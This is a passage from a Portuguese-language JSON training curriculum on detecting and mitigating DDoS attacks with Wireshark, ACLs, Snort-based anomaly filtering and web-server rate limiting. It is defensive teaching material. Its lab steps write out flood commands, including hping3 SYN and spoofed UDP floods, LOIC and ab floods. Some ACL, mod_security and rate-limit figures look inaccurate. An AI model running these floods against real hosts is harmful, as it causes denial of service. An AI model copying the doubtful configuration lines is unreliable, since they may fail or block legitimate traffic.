                                  "verification": "Capture 100 pacotes legítimos e confirme visualização correta no Wireshark.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Wireshark (versão mais recente)",
                                    "Máquina virtual com Kali Linux ou similar"
                                  ],
                                  "tips": "Desative filtros SSL/TLS se necessário para descriptografar tráfego básico.",
                                  "learningObjective": "Preparar ambiente de análise de pacotes de forma eficiente e segura.",
                                  "commonMistakes": [
                                    "Captura em interface errada, perdendo tráfego",
                                    "Sobrecarga de disco por capturas longas sem limite"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar pacotes para identificar padrões maliciosos",
                                  "subSteps": [
                                    "Aplique filtros de display: 'tcp.flags.syn==1 && tcp.flags.ack==0' para SYN flood.",
                                    "Examine estatísticas: IO Graph para picos de taxa de pacotes.",
                                    "Verifique endpoints: Protocol Hierarchy para dominância UDP/ICMP.",
                                    "Inspecione payloads: tamanhos zero ou repetitivos indicam floods.",
                                    "Gere relatórios: Exporte estatísticas para confirmação visual."
                                  ],
                                  "verification": "Identifique manualmente 5 pacotes suspeitos em uma captura simulada.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Arquivo .pcap de tráfego simulado",
                                    "Ferramentas auxiliares como tshark CLI"
                                  ],
                                  "tips": "Use coloração de pacotes para destacar SYN/UDP/ICMP automaticamente.",
                                  "learningObjective": "Aplicar filtros e visualizações para detectar assinaturas de DDoS.",
                                  "commonMistakes": [
                                    "Filtros mal escritos, como esquecer &&",
                                    "Confundir burst legítimo com flood"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Diferenciar tráfego malicioso de legítimo e validar identificação",
                                  "subSteps": [
                                    "Compare capturas: legítima (navegação normal) vs. maliciosa (simulada).",
                                    "Calcule métricas: pacotes/segundo >1000 para suspeita.",
                                    "Teste cenários mistos: identificar floods em tráfego híbrido.",
                                    "Documente achados: crie relatório com screenshots e explicações.",
                                    "Pratique com datasets públicos (ex: CIC-DDoS2019)."
                                  ],
                                  "verification": "Classifique corretamente 10 capturas mistas como legítimas ou DDoS.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Datasets DDoS públicos",
                                    "hping3 para simulação local"
                                  ],
                                  "tips": "Defina thresholds baseados em baselines de rede conhecidas.",
                                  "learningObjective": "Discernir com precisão tráfego DDoS de variações normais de uso.",
                                  "commonMistakes": [
                                    "Falso positivo em horários de pico legítimos",
                                    "Ignorar distribuição geográfica de IPs"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório virtual, use hping3 para simular um SYN flood ('hping3 --syn -p 80 -i u100 targetIP') contra um servidor Apache local. Capture com Wireshark, aplique filtro 'tcp.flags.syn==1', observe >500 SYN/s sem ACKs e diferencie de uma sessão HTTP normal (SYN+ACK+data).",
                              "finalVerifications": [
                                "Identifica floods SYN por SYN excessivos sem ACK.",
                                "Detecta UDP floods por pacotes aleatórios em portas múltiplas.",
                                "Reconhece ICMP floods por echoes de ping massivos.",
                                "Calcula taxa de pacotes corretamente (>1000pps suspeito).",
                                "Diferencia tráfego legítimo por presença de handshakes completos.",
                                "Gera relatório com evidências visuais de Wireshark."
                              ],
                              "assessmentCriteria": [
                                "Precisão >90% em identificação de 20 amostras mistas.",
                                "Tempo de análise <5 minutos por captura de 1 minuto.",
                                "Uso correto de filtros Wireshark sem erros sintáticos.",
                                "Relatório inclui métricas quantitativas (pps, % protocolos).",
                                "Explicação clara de diferenciação legítimo vs. malicioso.",
                                "Aplicação de pelo menos 3 filtros distintos."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos TCP/UDP/ICMP em profundidade.",
                                "Análise de Dados: Estatísticas e gráficos de tráfego (IO Graphs).",
                                "Programação: Scripts Python com Scapy para automação de análise.",
                                "Estatística: Cálculo de baselines e detecção de anomalias.",
                                "Ética em TI: Implicações legais de simulações de ataques."
                              ],
                              "realWorldApplication": "Em centros de operações de segurança (SOC), analistas usam Wireshark para inspecionar tráfego em tempo real durante incidentes DDoS, permitindo filtragem rápida em firewalls/IPS e minimizando downtime em sites de e-commerce ou serviços bancários."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.1.2",
                            "name": "Configurar listas de controle de acesso (ACLs)",
                            "description": "Implementar ACLs em roteadores ou firewalls (ex.: Cisco IOS ou iptables) para filtrar IPs de origem suspeitos, portas ou protocolos comuns em ataques DDoS, testando em ambiente simulado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Planejar a estrutura da ACL para mitigação de DDoS",
                                  "subSteps": [
                                    "Identificar padrões comuns de tráfego DDoS, como IPs spoofed, floods UDP/TCP SYN e portas usadas em amplificações (ex.: 53 DNS, 123 NTP)",
                                    "Listar regras específicas: deny por IP de origem suspeito, deny por protocolo/porta (ex.: UDP >1024 para origem, TCP SYN sem ACK)",
                                    "Definir a ordem das regras (deny específicos antes de permit any)",
                                    "Escolher a plataforma (Cisco IOS para roteadores ou iptables para firewalls Linux) e interface de aplicação (inbound na interface externa)",
                                    "Documentar a ACL em pseudocódigo ou diagrama para revisão"
                                  ],
                                  "verification": "Lista de regras planejadas documentada e revisada por pares, confirmando cobertura de vetores DDoS comuns",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação oficial Cisco IOS (access-list commands)",
                                    "Guia iptables man page",
                                    "Exemplos de logs de ataques DDoS simulados"
                                  ],
                                  "tips": "Sempre inclua uma regra 'permit ip any any' no final para evitar bloqueio total de tráfego legítimo",
                                  "learningObjective": "Compreender os componentes essenciais de uma ACL eficaz contra ataques DDoS",
                                  "commonMistakes": [
                                    "Ignorar a ordem das regras (deny antes de permit)",
                                    "Esquecer tráfego de retorno legítimo",
                                    "Não considerar falsos positivos em IPs dinâmicos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar ACL básica no dispositivo",
                                  "subSteps": [
                                    "Acessar o modo de configuração privilegiado (enable, configure terminal no Cisco IOS)",
                                    "Criar uma ACL numerada ou nomeada (ex.: access-list 101 deny ip host 192.0.2.1 any no Cisco; ou iptables -N DDoS_ACL)",
                                    "Adicionar regra inicial de deny para IP suspeito (ex.: access-list 101 deny ip host 203.0.113.10 any)",
                                    "Salvar a configuração temporariamente (end, wr no Cisco; iptables-save > /etc/iptables.rules)",
                                    "Verificar sintaxe com show access-lists ou iptables -L -v -n"
                                  ],
                                  "verification": "Comando de exibição mostra ACL criada sem erros de sintaxe e regras listadas corretamente",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Emulador Cisco Packet Tracer ou GNS3",
                                    "Máquina virtual Linux com iptables",
                                    "Acesso console ao roteador/firewall simulado"
                                  ],
                                  "tips": "Use ACLs estendidas (100-199 no Cisco) para filtragem por IP origem/destino e portas",
                                  "learningObjective": "Dominar a sintaxe básica de criação de ACLs em Cisco IOS e iptables",
                                  "commonMistakes": [
                                    "Usar ACL padrão em vez de estendida para filtros complexos",
                                    "Não especificar direção (in/out)",
                                    "Erros de digitação em IPs"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Adicionar regras específicas para vetores DDoS",
                                  "subSteps": [
                                    "Adicionar deny para protocolos comuns em DDoS (ex.: access-list 101 deny udp any any eq 53; para DNS amp)",
                                    "Incluir deny para floods SYN (ex.: access-list 101 deny tcp any any syn; ou rate-limiting se suportado)",
                                    "Bloquear portas origem altas em UDP (ex.: access-list 101 deny udp any gt 1024 eq 123; para NTP)",
                                    "Adicionar log para monitoramento (ex.: access-list 101 deny ip any any log-input)",
                                    "Otimizar ordem: regras mais específicas primeiro"
                                  ],
                                  "verification": "Exibição da ACL mostra todas regras DDoS-specific adicionadas e ordenadas corretamente",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Lista de vetores DDoS comuns (referência NIST ou Cisco)",
                                    "Ferramenta de simulação de tráfego como hping3"
                                  ],
                                  "tips": "Combine com rate-limiting (ex.: police no Cisco) para eficiência sem bloquear tudo",
                                  "learningObjective": "Implementar regras ACL targeted para mitigar tipos específicos de DDoS",
                                  "commonMistakes": [
                                    "Regras muito amplas bloqueando tráfego legítimo",
                                    "Falta de logging para auditoria",
                                    "Ordem incorreta causando bypass"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar e ativar a ACL nas interfaces",
                                  "subSteps": [
                                    "Identificar interface externa exposta a internet (ex.: GigabitEthernet0/0)",
                                    "Aplicar ACL inbound (ex.: interface Gi0/0; ip access-group 101 in no Cisco; iptables -A INPUT -j DDoS_ACL)",
                                    "Verificar aplicação com show ip interface ou iptables -L -v",
                                    "Salvar configuração permanentemente",
                                    "Reiniciar simulação para testar persistência"
                                  ],
                                  "verification": "Comando show confirma ACL aplicada à interface correta na direção inbound",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Topologia simulada com roteador/firewall e hosts atacante/vítima"
                                  ],
                                  "tips": "Teste em lab isolado antes de produção para evitar downtime",
                                  "learningObjective": "Aplicar ACLs corretamente a interfaces para proteção efetiva",
                                  "commonMistakes": [
                                    "Aplicar na direção errada (outbound em vez de inbound)",
                                    "Esquecer salvar configuração",
                                    "Aplicar a interface interna por engano"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e validar a ACL em ambiente simulado",
                                  "subSteps": [
                                    "Gerar tráfego suspeito (ex.: hping3 --udp -p 53 --spoof 203.0.113.10 victim_ip)",
                                    "Gerar tráfego legítimo (ping, HTTP normal)",
                                    "Monitorar contadores (show access-list; watch 'iptables -L -v -n')",
                                    "Analisar logs para hits em denies",
                                    "Ajustar regras se necessário e retestar"
                                  ],
                                  "verification": "Contadores mostram hits em denies para tráfego DDoS, zero drops em legítimo; logs confirmam bloqueios",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramentas: hping3, nmap, Wireshark para captura de pacotes",
                                    "Ambiente simulado com múltiplos hosts"
                                  ],
                                  "tips": "Use Wireshark para visualizar pacotes dropados vs permitidos",
                                  "learningObjective": "Validar eficácia da ACL através de testes simulados de ataque",
                                  "commonMistakes": [
                                    "Não testar tráfego legítimo (causando falsos positivos)",
                                    "Ignorar contadores de hits",
                                    "Testes insuficientes em escala"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um roteador Cisco simulando proteção a um servidor web sob UDP flood DNS (porta 53 de IPs spoofed como 192.0.2.0/24), configure: access-list 101 deny udp 192.0.2.0 0.0.0.255 any eq 53 log; access-list 101 permit ip any any; aplique em interface inbound. Teste com hping3 simulando 1000pps de flood, confirmando drops nos contadores.",
                              "finalVerifications": [
                                "ACL aplicada sem erros e persistente após reboot",
                                "Tráfego DDoS simulado (IPs/portas suspeitas) é bloqueado conforme logs e contadores",
                                "Tráfego legítimo (HTTP, DNS resolvido, ping) passa sem interrupções",
                                "Nenhum impacto mensurável na latência ou throughput geral",
                                "Documentação completa das regras e testes realizada",
                                "Preparado para automação ou integração com IDS/IPS"
                              ],
                              "assessmentCriteria": [
                                "Precisão e correção sintática de todas as regras ACL",
                                "Cobertura completa de vetores DDoS comuns sem oversimplificação",
                                "Ordem otimizada das regras para performance",
                                "Evidências claras de testes (screenshots de contadores/logs/Wireshark)",
                                "Análise de potenciais falsos positivos e mitigações",
                                "Documentação clara e reproduzível"
                              ],
                              "crossCurricularConnections": [
                                "Redes: Profundo entendimento de cabeçalhos IP/TCP/UDP e roteamento",
                                "Análise de Dados: Interpretação de logs de firewall e padrões de tráfego",
                                "Programação: Automatização de ACLs via scripts Python (netmiko para Cisco) ou Ansible",
                                "Ética e Governança: Considerações de privacidade em filtragem de IPs e conformidade GDPR",
                                "Matemática: Cálculo de taxas de taxa-limiting e probabilidades de falsos positivos"
                              ],
                              "realWorldApplication": "Em ISPs e data centers (ex.: Cloudflare, AWS Shield), ACLs filtram volumetric DDoS em borda de rede, bloqueando milhões de pacotes/segundo de fontes maliciosas, mantendo disponibilidade de serviços críticos como e-commerce e bancos durante ataques reais de 100Gbps+."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.1.3",
                            "name": "Aplicar filtragem baseada em comportamento",
                            "description": "Utilizar sistemas de detecção de anomalias para filtrar tráfego baseado em baselines de volume, taxa de pacotes ou entropia de endereços IP, integrando com ferramentas como Snort.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Estabelecer baselines de tráfego normal",
                                  "subSteps": [
                                    "Colete dados de tráfego de rede por pelo menos 24-48 horas em condições normais usando ferramentas como tcpdump ou Wireshark.",
                                    "Calcule métricas baselines: volume médio de pacotes (pps), taxa de bytes por segundo e entropia de endereços IP fonte/destino.",
                                    "Analise variações diárias e sazonais para definir thresholds (ex: média + 3 desvios padrão).",
                                    "Documente as baselines em um relatório com gráficos de distribuição.",
                                    "Valide baselines com dados históricos de tráfego conhecido."
                                  ],
                                  "verification": "Baselines documentadas com métricas calculadas e thresholds definidos, confirmados por gráficos gerados.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": "Tcpdump/Wireshark, Python com bibliotecas pandas e matplotlib, servidor de monitoramento (ex: ELK Stack).",
                                  "tips": "Colete dados em horários variados para capturar picos naturais e evite dias de feriados.",
                                  "learningObjective": "Compreender e quantificar o comportamento normal de tráfego de rede para detecção de anomalias.",
                                  "commonMistakes": "Usar período curto de coleta (leva a baselines imprecisas) ou ignorar variações horárias."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar sistema de detecção de anomalias",
                                  "subSteps": [
                                    "Instale e configure uma ferramenta de detecção como Suricata ou Zeek para monitoramento em tempo real.",
                                    "Implemente scripts para monitorar volume, taxa de pacotes e entropia (use Shannon entropy para IPs).",
                                    "Defina alertas para desvios acima dos thresholds das baselines (ex: >200% do baseline).",
                                    "Integre com um dashboard como Kibana para visualização de anomalias.",
                                    "Teste com tráfego simulado normal para calibrar falsos positivos."
                                  ],
                                  "verification": "Sistema gera alertas corretos para tráfego simulado dentro/fora das baselines, visível no dashboard.",
                                  "estimatedTime": "3-5 horas",
                                  "materials": "Suricata/Zeek, ELK Stack (Elasticsearch, Logstash, Kibana), scripts Python para entropia.",
                                  "tips": "Use funções prontas de entropia em bibliotecas como scikit-learn para precisão.",
                                  "learningObjective": "Configurar monitoramento automatizado para identificar desvios comportamentais em tráfego.",
                                  "commonMistakes": "Thresholds muito baixos (muitos falsos positivos) ou altos (perde ataques reais)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Definir e aplicar regras de filtragem baseadas em comportamento",
                                  "subSteps": [
                                    "Crie regras condicionais: bloquear IPs com entropia baixa (bots DDoS) ou taxa de pacotes > threshold.",
                                    "Configure filtragem em firewall/IPS como nftables ou iptables com base em outputs da detecção.",
                                    "Implemente rate limiting dinâmico baseado em baselines (ex: limitar a 150% do normal).",
                                    "Ative logging detalhado para ações de filtragem.",
                                    "Aplique regras em modo teste (log only) antes de bloquear."
                                  ],
                                  "verification": "Regras aplicadas geram logs de filtragem para tráfego simulado anômalo sem afetar normal.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": "nftables/iptables, scripts de automação (Bash/Python), servidor de teste com tráfego gerado.",
                                  "tips": "Comece com whitelists para tráfego crítico para evitar bloqueios acidentais.",
                                  "learningObjective": "Desenvolver regras acionáveis que filtrem tráfego anômalo preservando o legítimo.",
                                  "commonMistakes": "Regras muito amplas (bloqueia clientes legítimos) ou ausência de logging."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar com Snort e testar a solução completa",
                                  "subSteps": [
                                    "Instale Snort e configure regras personalizadas para anomalias detectadas (ex: alertas para alto volume).",
                                    "Integre outputs de detecção com Snort via syslog ou API para ativação automática de bloqueios.",
                                    "Simule ataque DDoS com ferramentas como hping3 ou LOIC em ambiente controlado.",
                                    "Monitore mitigação: verifique redução de tráfego anômalo e uptime de serviços.",
                                    "Ajuste thresholds com base em resultados do teste."
                                  ],
                                  "verification": "Snort bloqueia tráfego DDoS simulado enquanto permite tráfego baseline, com logs confirmando.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": "Snort, hping3/LOIC para simulação, VM para ambiente isolado.",
                                  "tips": "Use VMs isoladas para testes para evitar impactos reais.",
                                  "learningObjective": "Integrar detecção comportamental com IPS como Snort para mitigação automatizada.",
                                  "commonMistakes": "Testes sem isolamento (risco de loop de amplificação) ou integração falha sem validação."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Monitorar, otimizar e documentar",
                                  "subSteps": [
                                    "Configure monitoramento contínuo com alertas via email/Slack para anomalias.",
                                    "Analise logs pós-teste para otimizar thresholds e regras.",
                                    "Crie playbook de resposta: passos para ativação manual/emergência.",
                                    "Documente configuração completa, baselines e lições aprendidas.",
                                    "Realize auditoria de segurança na implementação."
                                  ],
                                  "verification": "Sistema monitorado gera relatórios diários e playbook pronto para uso.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": "Ferramentas de alerting (Prometheus/Grafana), template de playbook.",
                                  "tips": "Automatize relatórios semanais para manutenção proativa.",
                                  "learningObjective": "Estabelecer processos sustentáveis para operação e melhoria contínua.",
                                  "commonMistakes": "Falta de documentação (dificulta handoff) ou monitoramento inadequado."
                                }
                              ],
                              "practicalExample": "Em um servidor web sob ataque DDoS de 10k pps de IPs com baixa entropia, o sistema detecta desvio de baseline (normal: 1k pps), ativa Snort para bloquear fontes anômalas, reduzindo tráfego para 1.2k pps e restaurando acesso legítimo em <5min.",
                              "finalVerifications": [
                                "Tráfego anômalo é detectado e filtrado em <30s de início do ataque.",
                                "Taxa de falsos positivos <5% em testes com tráfego misto.",
                                "Integração Snort ativa bloqueios automáticos com logs auditáveis.",
                                "Baselines atualizadas refletem mudanças sazonais.",
                                "Uptime de serviços >99% durante simulação de DDoS.",
                                "Playbook de resposta testado e funcional."
                              ],
                              "assessmentCriteria": [
                                "Precisão da detecção: >95% recall em anomalias simuladas.",
                                "Latência de resposta: filtragem em <1min.",
                                "Eficiência: uso de CPU/RAM <20% adicional durante pico.",
                                "Robustez: sem interrupções em tráfego legítimo.",
                                "Documentação: completa e compreensível para réplica.",
                                "Otimização: thresholds ajustados pós-teste."
                              ],
                              "crossCurricularConnections": [
                                "Estatística: cálculo de entropia e desvios padrão.",
                                "Redes de Computadores: análise de protocolos e tráfego IP.",
                                "Machine Learning: baselines como modelo unsupervised simples.",
                                "Programação: scripts Python/Bash para automação.",
                                "Gestão de Projetos: documentação de playbooks."
                              ],
                              "realWorldApplication": "Provedores de cloud como AWS Shield usam filtragem comportamental para mitigar DDoS em escala global, bloqueando bilhões de pacotes maliciosos diariamente e protegendo e-commerces durante Black Friday."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.5.2",
                        "name": "Rate Limiting",
                        "description": "Mecanismo que limita a taxa de requisições por IP, usuário ou sessão, prevenindo floods ao impor tetos em conexões simultâneas ou pacotes por segundo.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.5.2.1",
                            "name": "Compreender princípios de rate limiting",
                            "description": "Explicar algoritmos como Token Bucket e Leaky Bucket, e seu impacto na mitigação de ataques como HTTP floods ou Slowloris, com exemplos matemáticos de configuração de limites.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os conceitos fundamentais de Rate Limiting",
                                  "subSteps": [
                                    "Definir rate limiting como mecanismo de controle de taxa de requisições para prevenir sobrecarga.",
                                    "Identificar cenários comuns: APIs, servidores web e microsserviços.",
                                    "Explicar benefícios: proteção contra abusos, garantia de QoS e escalabilidade.",
                                    "Diferenciar rate limiting de throttling e circuit breakers.",
                                    "Analisar impacto em ataques como floods de requisições."
                                  ],
                                  "verification": "Explicar em 3 frases o que é rate limiting e dar um exemplo de uso.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Artigo 'Rate Limiting Basics' no Medium",
                                    "Vídeo Khan Academy sobre filas"
                                  ],
                                  "tips": "Use analogia de bilheteira de cinema para visualizar limites de entrada.",
                                  "learningObjective": "Compreender o propósito e contextos de aplicação do rate limiting.",
                                  "commonMistakes": [
                                    "Confundir com autenticação",
                                    "Subestimar necessidade em sistemas de alta carga"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o algoritmo Token Bucket",
                                  "subSteps": [
                                    "Descrever o modelo: balde virtual preenchido com tokens a taxa constante.",
                                    "Explicar mecânica: requisição consome token; sem token, bloqueada.",
                                    "Calcular exemplo matemático: balde de 100 tokens, refill 10/minuto.",
                                    "Simular burst: permitir picos iniciais até capacidade do balde.",
                                    "Discutir implementação com Redis ou memória."
                                  ],
                                  "verification": "Resolver cálculo: quantos requests em 5 min com refill 20/min e balde 50?",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Diagrama Token Bucket no Wikipedia",
                                    "Código Python exemplo no GitHub"
                                  ],
                                  "tips": "Visualize tokens como 'moedas' para gastar em ações.",
                                  "learningObjective": "Dominar funcionamento e matemática do Token Bucket.",
                                  "commonMistakes": [
                                    "Ignorar burst capacity",
                                    "Confundir refill rate com burst size"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar o algoritmo Leaky Bucket",
                                  "subSteps": [
                                    "Descrever modelo: fila com vazamento constante a taxa fixa.",
                                    "Explicar: requisições entram na fila; saem a taxa máxima permitida.",
                                    "Calcular exemplo: vazamento 5 req/seg, fila max 100; overflow rejeita.",
                                    "Comparar com Token Bucket: smoothing vs burst allowance.",
                                    "Analisar em ataques Slowloris: fila enche devagar."
                                  ],
                                  "verification": "Explicar por que Leaky Bucket é melhor para traffic shaping.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Infográfico Leaky Bucket AWS",
                                    "Simulador online de filas"
                                  ],
                                  "tips": "Pense em mangueira com furo: água (req) vaza sempre na mesma velocidade.",
                                  "learningObjective": "Compreender mecânica e diferenças do Leaky Bucket.",
                                  "commonMistakes": [
                                    "Confundir vazamento com refill",
                                    "Subestimar tamanho da fila"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar em mitigação de ataques DDoS com exemplos matemáticos",
                                  "subSteps": [
                                    "Simular HTTP flood: 1000 req/min vs limite 100/min Token Bucket.",
                                    "Configurar Leaky Bucket para Slowloris: vazamento 1 req/10s por IP.",
                                    "Calcular thresholds: probabilidade de bloqueio falso com Poisson.",
                                    "Comparar algoritmos em cenários: burst DDoS vs sustained flood.",
                                    "Discutir tuning: basear em baselines de tráfego normal."
                                  ],
                                  "verification": "Configurar limites matemáticos para um cenário dado e justificar.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Docs NGINX rate limiting",
                                    "Calculadora online Token Bucket"
                                  ],
                                  "tips": "Monitore logs reais para ajustar rates empiricamente.",
                                  "learningObjective": "Aplicar algoritmos em contextos de segurança cibernética.",
                                  "commonMistakes": [
                                    "Rates muito baixos causam DoS próprio",
                                    "Ignorar distribuição de IPs"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma API Flask, implemente Token Bucket com Redis: limite 60 req/min por IP (balde 10, refill 1/min). Teste com script flood simulado (ab -n 200 -c 10) e verifique logs de rejeição em ataques HTTP flood.",
                              "finalVerifications": [
                                "Explicar Token Bucket e Leaky Bucket com diagramas simples.",
                                "Calcular capacidade burst para balde de 50 tokens e refill 20/min.",
                                "Simular mitigação de Slowloris com Leaky Bucket (fila 20, vazamento 1/30s).",
                                "Comparar prós/contras em DDoS scenarios.",
                                "Configurar limites matemáticos para API com 100 users normais.",
                                "Identificar quando usar cada algoritmo."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição dos algoritmos (80%+ correta).",
                                "Corretude matemática em cálculos de limites (sem erros).",
                                "Capacidade de ligar a ataques DDoS com exemplos reais.",
                                "Clareza em comparações e trade-offs.",
                                "Criatividade em configurações práticas.",
                                "Uso de analogias para explicação."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Modelos de filas (M/M/1), distribuições Poisson para tráfego.",
                                "Programação: Implementação em Python (redis-ratelimit) ou Go.",
                                "Redes: Integração com load balancers como HAProxy/NGINX.",
                                "Estatística: Análise de baselines de tráfego e detecção de anomalias.",
                                "Administração de Sistemas: Monitoramento com Prometheus/Grafana."
                              ],
                              "realWorldApplication": "Empresas como Cloudflare e AWS Shield usam rate limiting (Token/Leaky Bucket) para mitigar DDoS em APIs públicas, CDNs e serviços como Twitter/X (limite 300 req/3h por app), prevenindo perdas financeiras e downtime."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.2.2",
                            "name": "Implementar rate limiting em servidores web",
                            "description": "Configurar módulos como mod_security no Apache ou nginx limit_req para restringir requisições HTTP/HTTPS por IP, simulando ataques para validar eficácia.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente de teste",
                                  "subSteps": [
                                    "Instale um servidor web como Nginx ou Apache em uma VM ou container Docker para isolamento.",
                                    "Configure um site de teste simples (ex: página HTML básica) acessível via HTTP/HTTPS.",
                                    "Instale ferramentas de teste como Apache Bench (ab) ou siege para simular tráfego.",
                                    "Habilite logs detalhados no servidor para monitorar requisições.",
                                    "Defina um IP de teste (use loopback ou múltiplas VMs para simular IPs diferentes)."
                                  ],
                                  "verification": "Confirme que o site responde normalmente com requisições baixas (ex: curl http://localhost retorna 200 OK).",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "VM/Docker com Ubuntu/Debian",
                                    "Nginx ou Apache2",
                                    "Apache Bench (sudo apt install apache2-utils)",
                                    "Editor de texto (nano/vim)"
                                  ],
                                  "tips": "Use Docker para ambientes descartáveis: docker run -p 80:80 nginx.",
                                  "learningObjective": "Entender a configuração base de um servidor web para testes seguros de rate limiting.",
                                  "commonMistakes": [
                                    "Não isolar o ambiente de produção",
                                    "Esquecer de habilitar logs",
                                    "Usar IP real sem proxy para testes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar rate limiting no Nginx com limit_req",
                                  "subSteps": [
                                    "Edite o arquivo de configuração nginx.conf ou sites-enabled/default.",
                                    "Defina uma zona de limite: limit_req_zone $binary_remote_addr zone=mylimit:10m rate=10r/s;",
                                    "No bloco server/location, adicione: limit_req zone=mylimit burst=20 nodelay;",
                                    "Recarregue o Nginx: nginx -t && systemctl reload nginx.",
                                    "Teste básico com curl para verificar aplicação do limite."
                                  ],
                                  "verification": "Requisições rápidas (>10/s) retornam 503 Service Temporarily Unavailable.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Nginx instalado",
                                    "Documentação oficial Nginx limit_req",
                                    "curl ou browser"
                                  ],
                                  "tips": "Use $binary_remote_addr para eficiência em IPs IPv6; ajuste 'burst' para tolerância inicial.",
                                  "learningObjective": "Configurar rate limiting baseado em IP no Nginx de forma eficiente.",
                                  "commonMistakes": [
                                    "Esquecer de definir a zona global",
                                    "Não testar sintaxe com nginx -t",
                                    "Rate muito baixo causando falsos positivos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar rate limiting no Apache com mod_evasive ou mod_security",
                                  "subSteps": [
                                    "Instale módulos: sudo apt install libapache2-mod-evasive ou libapache2-mod-security2.",
                                    "Para mod_evasive, edite /etc/apache2/mods-available/evasive.conf: DOSPageCount 5, DOSSiteCount 50.",
                                    "Para mod_security, crie regra: SecRule IP:ScoreThreshold 10, adicione rate limiting ruleset.",
                                    "Ative o módulo: a2enmod evasive && systemctl restart apache2.",
                                    "Configure logs para capturar eventos de evasão."
                                  ],
                                  "verification": "Logs mostram bloqueios após threshold (ex: tail -f /var/log/apache2/error.log).",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Apache2 instalado",
                                    "libapache2-mod-evasive",
                                    "Documentação mod_security OWASP CRS"
                                  ],
                                  "tips": "Combine com fail2ban para bans persistentes; teste em location específica primeiro.",
                                  "learningObjective": "Aplicar mecanismos de rate limiting no Apache para proteção contra floods.",
                                  "commonMistakes": [
                                    "Módulo não ativado",
                                    "Thresholds muito agressivos bloqueando usuários legítimos",
                                    "Ignorar compatibilidade IPv4/IPv6"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular ataques e validar eficácia",
                                  "subSteps": [
                                    "Execute teste baixo: ab -n 50 -c 1 http://localhost/ (deve passar).",
                                    "Simule flood: ab -n 1000 -c 50 http://localhost/ (deve throttlear).",
                                    "Use múltiplos IPs/VMs para DDoS simulado e verifique bloqueios por IP.",
                                    "Monitore métricas: CPU, memória, logs de rate limit.",
                                    "Ajuste parâmetros baseados em resultados (ex: aumentar burst)."
                                  ],
                                  "verification": "Ferramentas de teste mostram erros 429/503 após limite; site permanece responsivo para tráfego normal.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Apache Bench/siege",
                                    "Múltiplas VMs ou proxies para IPs",
                                    "htop para monitoramento"
                                  ],
                                  "tips": "Use --no-check-certificate se HTTPS; grave saídas para análise.",
                                  "learningObjective": "Validar rate limiting através de simulações realistas de ataques.",
                                  "commonMistakes": [
                                    "Testar só com um IP",
                                    "Ignorar latência em testes",
                                    "Não comparar before/after"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Otimizar, documentar e integrar monitoramento",
                                  "subSteps": [
                                    "Analise logs para falsos positivos e ajuste rates.",
                                    "Integre com ferramentas como Prometheus/Grafana para métricas de rate limit.",
